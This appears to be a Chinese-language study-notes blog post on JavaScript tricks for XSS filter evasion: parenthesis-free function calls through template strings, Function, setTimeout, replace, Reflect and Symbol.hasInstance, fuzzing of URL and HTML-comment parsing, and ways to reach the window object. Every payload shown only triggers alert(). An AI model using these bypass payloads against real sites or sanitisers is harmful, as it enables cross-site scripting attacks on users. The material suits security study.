<p><strong>逗号处理</strong></p>
<p>在js中，逗号表达式会从左到右处理表达式，并放回最后一个值。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = (alert(), <span class="number">10</span>) <span class="comment">//alert弹窗</span></span><br><span class="line"><span class="built_in">console</span>.log(foo) <span class="comment">//10</span></span><br></pre></td></tr></table></figure>
<p>借助这一个特性，可以通过throw来执行弹窗：</p>
<blockquote>
<p> 本地测试并没有执行弹窗，但书上说执行了</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> onerror=alert,<span class="number">1337</span></span><br></pre></td></tr></table></figure>
<h4 id="使用模板字符串"><a href="#使用模板字符串" class="headerlink" title="使用模板字符串"></a>使用模板字符串</h4><p><strong>滥用alert函数</strong></p>
<p>在基本概念中提到，使用反引号可以进行函数调用，并且支持嵌套解析：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert<span class="string">`123`</span></span><br><span class="line"><span class="string">`<span class="subst">$&#123;alert(<span class="number">1337</span>)&#125;</span>`</span></span><br><span class="line"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;alert(<span class="number">1337</span>)&#125;</span>`</span>&#125;</span>`</span></span><br></pre></td></tr></table></figure>
<p>如果在传参中使用表达式，会用逗号来代替，无论<code>${}</code>中的内容是什么，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert<span class="string">`foo<span class="subst">$&#123;<span class="number">1</span>&#125;</span>bar`</span> <span class="comment">//foo,bar</span></span><br><span class="line">alert<span class="string">`foo<span class="subst">$&#123;<span class="string">'aaa'</span>&#125;</span>bar`</span> <span class="comment">//foo,bar</span></span><br></pre></td></tr></table></figure>
<p>除了<code>alert</code>，是否可以使用<code>eval</code>呢？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span><span class="string">`alert\x281337\x29`</span> <span class="comment">//alert不会被调用</span></span><br></pre></td></tr></table></figure>
<p>是否可以使用<code>setTimeout</code>呢？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout<span class="string">`alert\x281337\x29`</span> <span class="comment">//alert被调用</span></span><br></pre></td></tr></table></figure>
<p>为了搞清楚传入<code>alert</code>函数中的参数，我们可以自定义一个函数x，将参数打印出来：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>)</span><br><span class="line">&#125;</span><br><span class="line">x<span class="string">`<span class="subst">$&#123;<span class="string">'aaa'</span>&#125;</span><span class="subst">$&#123;<span class="string">'bbb'</span>&#125;</span><span class="subst">$&#123;<span class="string">'ccc'</span>&#125;</span>`</span> <span class="comment">//Arguments(4) [Array(4), 'aaa', 'bbb', 'ccc', callee: ƒ, ...]</span></span><br><span class="line">x<span class="string">`foo<span class="subst">$&#123;<span class="number">1</span>&#125;</span>bar`</span> <span class="comment">//Arguments(2) [Array(2), 1, callee: ƒ, Symbol(Symbol.iterator): ƒ]</span></span><br></pre></td></tr></table></figure>
<p>从输出结果可以看出，对于含有表达式的变量，会首先传入一个数组。这也就说明了，<code>alert</code>中嵌入表达式，会打印逗号：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert<span class="string">`foo<span class="subst">$&#123;<span class="number">1</span>&#125;</span>bar`</span> =&gt; alert([<span class="string">'foo'</span>, <span class="string">'bar'</span>], <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p><strong>滥用Function函数</strong></p>
<p><code>Function</code>是内置的一个构造函数，用于创建函数对象，它接受多个参数，最后一个参数会被视为方法体中执行的内容：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> add = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'return a + b;'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(add(<span class="number">2</span>, <span class="number">3</span>)); <span class="comment">//5</span></span><br></pre></td></tr></table></figure>
<p>因此可以使用模板字符串来传入参数，并执行<code>alert</code>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`x<span class="subst">$&#123;<span class="string">'alert\x281337\x29'</span>&#125;</span>`</span> <span class="comment">//不会执行alert</span></span><br><span class="line">=&gt;</span><br><span class="line"><span class="built_in">Function</span>([<span class="string">'x'</span>, <span class="string">''</span>], <span class="string">'alert(1337)'</span>) <span class="comment">//解析后的逻辑</span></span><br><span class="line">=&gt; </span><br><span class="line">ƒ anonymous(x,</span><br><span class="line">) &#123;</span><br><span class="line">alert(<span class="number">1337</span>)</span><br><span class="line">&#125; <span class="comment">//生成的匿名函数</span></span><br></pre></td></tr></table></figure>
<p>运行上面的代码，发现不行弹窗，因为生成的函数没有进行调用，可以做如下改动：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span><span class="string">`x<span class="subst">$&#123;<span class="string">'alert\x281337\x29'</span>&#125;</span></span></span><br></pre></td></tr></table></figure>
<p>=&gt;<br>Function([‘x’, ‘’], ‘alert(1337)’)()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**滥用setTimeout函数**</span><br><span class="line"></span><br><span class="line">`setTimeout`函数，他接受多个参数，第一个为调用函数，第二个为延时，后面为可选参数：</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">// setTimeout(callback, delay, arg1, arg2, ...)</span><br><span class="line">setTimeout(alert, 1000, 1, 2, 3)</span><br></pre></td></tr></table></figure></p>
<p>接下来尝试使用<code>setTimeout</code>函数和模板字符串组合，来执行无括号的JavaScript，根据上面对模板字符串的理解，执行模板字符串过程中，第一个变量会是一个数组，接下来才是模板字符串的内容：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">arguments</span>)</span><br><span class="line">&#125;</span><br><span class="line">x<span class="string">`<span class="subst">$&#123;alert&#125;</span><span class="subst">$&#123;<span class="number">0</span>&#125;</span><span class="subst">$&#123;<span class="number">1337</span>&#125;</span>`</span> <span class="comment">// Arguments(4) [Array(4), ƒ, 0, 1337, callee: ƒ, Symbol(Symbol.iterator): ƒ]</span></span><br></pre></td></tr></table></figure>
<p>因此，下面的方式都不会执行弹窗，因为传入的参数为一个数组，而不是<code>alert</code>函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout<span class="string">`<span class="subst">$&#123;alert&#125;</span><span class="subst">$&#123;<span class="number">0</span>&#125;</span><span class="subst">$&#123;<span class="number">1337</span>&#125;</span>`</span> <span class="comment">// Uncaught SyntaxError: Unexpected token ','</span></span><br></pre></td></tr></table></figure>
<p>是否可以使用上面提到的<code>call</code>方法，将第一个参数作为this的指向呢？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout.call<span class="string">`<span class="subst">$&#123;alert&#125;</span><span class="subst">$&#123;<span class="number">0</span>&#125;</span><span class="subst">$&#123;<span class="number">1337</span>&#125;</span>`</span> <span class="comment">// Uncaught TypeError: Illegal invocation</span></span><br></pre></td></tr></table></figure>
<p>答案是不可以，<del>因为当this的指向为<code>window</code>时，才可以弹窗</del></p>
<p>如果不考虑表达式，只传入模板字符串，是可以执行弹窗的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setTimeout<span class="string">`alert\x281337\x29`</span></span><br></pre></td></tr></table></figure>
<p><strong>滥用replace函数</strong></p>
<p><code>replace</code> 是字符串对象的一个内置方法，用于替换字符串中的文本。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// string.replace(searchValue, replaceValue) </span></span><br><span class="line"><span class="string">'aa'</span>.replace(<span class="string">'aa'</span>, <span class="string">'cc'</span>) <span class="comment">//cc</span></span><br><span class="line"><span class="string">'aa'</span>.replace(<span class="regexp">/.*/</span>, <span class="string">'cc'</span>) <span class="comment">//cc</span></span><br></pre></td></tr></table></figure>
<p>可以将替代的变量设置为<code>alert</code>，<code>replace</code>会将匹配到字符串传入<code>alert</code>函数中，从而执行弹窗:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'a'</span>.replace(<span class="regexp">/./</span>, alert) <span class="comment">//Call Success!</span></span><br></pre></td></tr></table></figure>
<p>因为本小节目标是在无括号的情况下执行，考虑使用模板字符串：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'a,'</span>.replace<span class="string">`a<span class="subst">$&#123;alert&#125;</span>`</span> <span class="comment">//执行弹窗:a,</span></span><br><span class="line">=&gt;</span><br><span class="line"><span class="string">'a,'</span>.replace([<span class="string">'a'</span>, <span class="string">''</span>], alert) <span class="comment">//实际执行的逻辑</span></span><br></pre></td></tr></table></figure>
<p>如何把逗号去掉，我们可以使用call方法：</p>
<blockquote>
<p>todo: 这里修改了this的指向，为什么还能弹窗？</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'a'</span>.replace.call<span class="string">`1<span class="subst">$&#123;<span class="regexp">/./</span>&#125;</span><span class="subst">$&#123;alert&#125;</span>`</span> <span class="comment">//执行弹窗:1</span></span><br></pre></td></tr></table></figure>
<p><strong>滥用Reflect函数</strong></p>
<p>Reflect 是一个内置的对象，提供了一组用于操作对象的方法。</p>
<ul>
<li><code>Reflect.apply(target, thisArg, argumentsList)</code>：调用目标函数，并传入指定的 <code>this</code> 值和参数列表。</li>
<li><code>Reflect.set(target, propertyKey, value[, receiver])</code>：设置目标对象的指定属性的值。</li>
</ul>
<p>调用<code>Reflect.apply.call</code>方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Reflect</span>.apply.call<span class="string">`<span class="subst">$&#123;alert&#125;</span><span class="subst">$&#123;<span class="built_in">window</span>&#125;</span><span class="subst">$&#123;[<span class="number">1337</span>]&#125;</span>`</span> <span class="comment">// 弹窗1337</span></span><br></pre></td></tr></table></figure>
<p>调用<code>Reflect.set.call</code>方法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Reflect</span>.set.call<span class="string">`<span class="subst">$&#123;location&#125;</span><span class="subst">$&#123;<span class="string">'href'</span>&#125;</span><span class="subst">$&#123;<span class="string">'javascript:alert(1337)'</span>&#125;</span>`</span> <span class="comment">// 弹窗1337</span></span><br></pre></td></tr></table></figure>
<h4 id="使用Has-instance-symbol"><a href="#使用Has-instance-symbol" class="headerlink" title="使用Has instance symbol"></a>使用Has instance symbol</h4><p><code>hashInstance</code>方法是用于检查一个对象是否属于某个特定的类（构造函数）或其原型链中的某个类。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;</span><br><span class="line">obj <span class="keyword">instanceof</span> <span class="built_in">Object</span> <span class="comment">//true</span></span><br></pre></td></tr></table></figure>
<p>在执行<code>instanceof</code>方法过程中，会涉及到<code>Symbol.hasInstance</code> ，它是一个内置的符号（Symbol），它是用于自定义对象的 instanceof 运算符行为的属性。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'alert\x281337\x29'</span><span class="keyword">instanceof</span>&#123;[<span class="built_in">Symbol</span>[<span class="string">'hasInstance'</span>]]:<span class="built_in">eval</span>&#125; <span class="comment">// 弹窗1337</span></span><br></pre></td></tr></table></figure>
<p>这段代码的意思是通过修改<code>hasInstance</code>的行为，将<code>&#39;alert\x281337\x29&#39;</code>传递给<code>eval</code>函数，从而导致弹窗。</p>
<p>其他变种：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'alert\x281337\x29'</span><span class="keyword">instanceof</span>&#123;[<span class="built_in">Symbol</span>.hasInstance]:<span class="built_in">eval</span>&#125; <span class="comment">// 弹窗1337</span></span><br></pre></td></tr></table></figure>
<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>当浏览器不遵循规范是，可以通过fuzzing技术来发现错误，并导致绕过某些限制。</p>
<h4 id="Fuzzing-Javascript-Urls"><a href="#Fuzzing-Javascript-Urls" class="headerlink" title="Fuzzing Javascript Urls"></a>Fuzzing Javascript Urls</h4><p>通过<code>javascript</code>伪协议，可以执行弹窗。接下来通过fuzzing技术，来探索是否有不遵循规范的解析：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">log = []</span><br><span class="line"><span class="keyword">let</span> anchor = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i &lt;= <span class="number">0x10ffff</span>; i++)&#123;</span><br><span class="line">    anchor.href = <span class="string">`javascript<span class="subst">$&#123;<span class="built_in">String</span>.fromCodePoint(i)&#125;</span>:`</span>;</span><br><span class="line">    <span class="keyword">if</span>(anchor.protocol === <span class="string">'javascript:'</span>)&#123;</span><br><span class="line">        log.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log <span class="comment">// [9, 10, 13, 58]</span></span><br></pre></td></tr></table></figure>
<p>在上面的代码中，在<code>javascript</code>后面添加其他字符，仍可以被识别为<code>javascript</code>协议。</p>
<p>接下来修改代码，在前面进行fuzz:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">log = []</span><br><span class="line"><span class="keyword">let</span> anchor = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i &lt;= <span class="number">0x10ffff</span>; i++)&#123;</span><br><span class="line">    anchor.href=<span class="string">`<span class="subst">$&#123;<span class="built_in">String</span>.fromCodePoint(i)&#125;</span>javascript:`</span>;</span><br><span class="line">    <span class="keyword">if</span>(anchor.protocol === <span class="string">'javascript:'</span>)&#123;</span><br><span class="line">        log.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log <span class="comment">// [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32]</span></span><br></pre></td></tr></table></figure>
<p>可以看到，在<code>javascript</code>前面有更多可利用的字符。为了进一步验证，我们通过dom来生成一下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> anchor = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line">anchor.href = <span class="string">`<span class="subst">$&#123;<span class="built_in">String</span>.fromCodePoint(<span class="number">20</span>)&#125;</span>javascript:alert(1)`</span> <span class="comment">// '\x14javascript:alert(1)'</span></span><br><span class="line">anchor.append(<span class="string">'click me!'</span>)</span><br><span class="line"><span class="built_in">document</span>.body.append(anchor)</span><br></pre></td></tr></table></figure>
<p>点击后发现是可以进行弹窗的。</p>
<p>需要注意的一点：通过dom生成的页面元素与通过HTML生成的页面元素，可能会有不同的预期，<code>&amp;#0</code>就是一个例子：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"<span class="symbol">&amp;#12;</span>javascript:alert(1337)"</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">a</span>&gt;</span>  <span class="comment">&lt;!-- 可以弹窗 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"<span class="symbol">&amp;#0;</span>javascript:alert(1337)"</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="comment">&lt;!-- 不可以弹窗 --&gt;</span></span><br></pre></td></tr></table></figure>
<p>对于需要点击的测试，可以使用一些自动化测试工具，如<code>Puppeteer</code></p>
<h4 id="Fuzzing-HTTP-URLs"><a href="#Fuzzing-HTTP-URLs" class="headerlink" title="Fuzzing HTTP URLs"></a>Fuzzing HTTP URLs</h4><p>通过模糊伪协议的方式，也可以对url的解析进行fuzz，测试代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">log = []</span><br><span class="line"><span class="keyword">let</span> anchor = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i &lt;= <span class="number">0x10ffff</span>; i++)&#123;</span><br><span class="line">    anchor.href = <span class="string">`<span class="subst">$&#123;<span class="built_in">String</span>.fromCodePoint(i)&#125;</span>https://www.example.com`</span>;</span><br><span class="line">    <span class="keyword">if</span>(anchor.hostname === <span class="string">'www.example.com'</span>)&#123;</span><br><span class="line">        log.push(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log <span class="comment">// [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32]</span></span><br></pre></td></tr></table></figure>
<p>对协议进行模糊，可以使用双斜杠引用外部URL。它们继承页面的当前协议，例如，如果网站使用<code>https://</code>协议相关URL，则将使用该协议:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>)</span><br><span class="line">log = []</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i &lt;= <span class="number">0x10ffff</span>; i++)&#123;</span><br><span class="line">    a.href = <span class="string">`/<span class="subst">$&#123;<span class="built_in">String</span>.fromCodePoint(i)&#125;</span>/garethheyes.co.uk`</span>;</span><br><span class="line">    <span class="keyword">if</span>(a.hostname === <span class="string">'garethheyes.co.uk'</span>)&#123;</span><br><span class="line">        log.push(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">log <span class="comment">//[9, 10, 13, 47, 92]</span></span><br></pre></td></tr></table></figure>
<h4 id="Fuzzing-HTML"><a href="#Fuzzing-HTML" class="headerlink" title="Fuzzing HTML"></a>Fuzzing HTML</h4><p>在HTML中，注释的格式为<code>&lt;!-- test --&gt;</code>，正常情况下<code>&lt;!-- --&gt;</code>里面的内容是可以随意填充，都会被识别为注释。是否存在特殊的情况，导致注释的内容逃逸呢，通过编写如下代码进行测试：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">log = []</span><br><span class="line"><span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>)</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;=<span class="number">0x10ffff</span>; i++)&#123;</span><br><span class="line">    div.innerHTML = <span class="string">`&lt;!--<span class="subst">$&#123;<span class="built_in">String</span>.fromCodePoint(i)&#125;</span>&lt;span&gt;&lt;/span&gt;--&gt;`</span>;</span><br><span class="line">    <span class="keyword">if</span> (div.querySelector(<span class="string">'span'</span>))&#123;</span><br><span class="line">        log.push(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">log <span class="comment">// [62]</span></span><br></pre></td></tr></table></figure>
<p>通输出结果看，62可以提前闭合注释。62转换的字符为<code>&gt;</code>。</p>
<h4 id="Fuzzing-known-behavious"><a href="#Fuzzing-known-behavious" class="headerlink" title="Fuzzing known behavious"></a>Fuzzing known behavious</h4><p>构造一个函数x，正常的调用方式为<code>x()</code>，接下来通过fuzz技术，来探测是否有其他的调用方式：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">log = []</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;=<span class="number">0x10ffff</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="string">`x<span class="subst">$&#123;<span class="built_in">String</span>.fromCodePoint(i)&#125;</span>()`</span>);</span><br><span class="line">      	log.push(i)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">log <span class="comment">// [9, 10, 11, 12, 13, 32, 160, 5760, 8192, 8193, 8194, 8195, 8196, 8197, 8198, 8199, 8200, 8201, 8202, 8232, 8233, 8239, 8287, 12288, 65279]</span></span><br></pre></td></tr></table></figure>
<h3 id="DOM-Hacker"><a href="#DOM-Hacker" class="headerlink" title="DOM Hacker"></a>DOM Hacker</h3><h4 id="获取window对象"><a href="#获取window对象" class="headerlink" title="获取window对象"></a>获取window对象</h4><p>window对象是JavaScript中的全局对象，它代表浏览器窗口或标签页，通过window对象，可以执行<code>alert</code>、<code>eval</code>等函数，用来执行任意JavaScript，对于沙盒环境，获取window对象，意味着进行了逃逸。</p>
<p>通过<code>document.defaultView</code> 属性，它返回与当前文档关联的窗口对象。通常情况下，这个窗口对象就是 window 对象，因为 window 对象是浏览器窗口的全局对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.defaultView.alert(<span class="number">1</span>) <span class="comment">//Call Success!</span></span><br></pre></td></tr></table></figure>
<p>通过元素的<code>ownerDocument</code>属性，可用于访问 DOM 元素的所属文档对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">node = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>)</span><br><span class="line">node.ownerDocument === <span class="built_in">document</span> <span class="comment">//true</span></span><br><span class="line">node.ownerDocument.defaultView.alert(<span class="number">1</span>) <span class="comment">//Call Success!</span></span><br></pre></td></tr></table></figure>
<p>JavaScript在处理错误时，<code>onerror</code>方法会接受一个<code>Event</code>对象，其中包含了错误所需的信息，通过<code>Event</code>对象，可以间接获取<code>window</code>对象：</p>
<blockquote>
<p>本地测试，event不存在path属性，因此不会弹窗</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span> <span class="attr">onerror</span>=<span class="string">"event.path.pop().alert(1337)"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>本地测试，event存在composedPath()方法，该方法或返回一个数组，其中最后一个元素为window</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">"console.log(event.composedPath())"</span>&gt;</span> <span class="comment">&lt;!-- [img, body, html, document, Window] --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">"event.composedPath().pop().alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其他变量：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">image</span> <span class="attr">href</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">evt.composedPath().pop().alert(1337)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此外，可以通过自定义<code>prepareStackTrace</code>属性的方式，获取window对象。这个函数接收两个参数，错误对象和一个数组，数组中包含了表示堆栈帧的对象。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span>.prepareStackTrace = <span class="function"><span class="keyword">function</span>(<span class="params">error, callSites</span>)</span>&#123; </span><br><span class="line">    callSites.shift().getThis().alert(<span class="number">1</span>);</span><br><span class="line">&#125;;</span><br><span class="line">test <span class="comment">//随便一个错误都会触发</span></span><br></pre></td></tr></table></figure>
<h4 id="HTML事件范围"><a href="#HTML事件范围" class="headerlink" title="HTML事件范围"></a>HTML事件范围</h4><p>这里主要讨论元素级事件。如<code>onerror</code>、<code>onclick</code>等方法。这个方法都是存在于<code>document</code>对象下面。</p>
<p>对于如下html代码，是可以进行弹窗的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">onerror</span>=<span class="string">defaultView.alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>通常，我们可以直接调用<code>alert</code>方法，是因为window对象下面的方法为全局方法，不需要特别的指定window对象。而<code>defaultView</code>方法，不是全局方法，为什么也可以呢？实际上，浏览器在处理html元素时，会执行类似如下方法，浏览器会自动寻找<code>document</code>对象下的<code>defaultView</code>方法：</p>
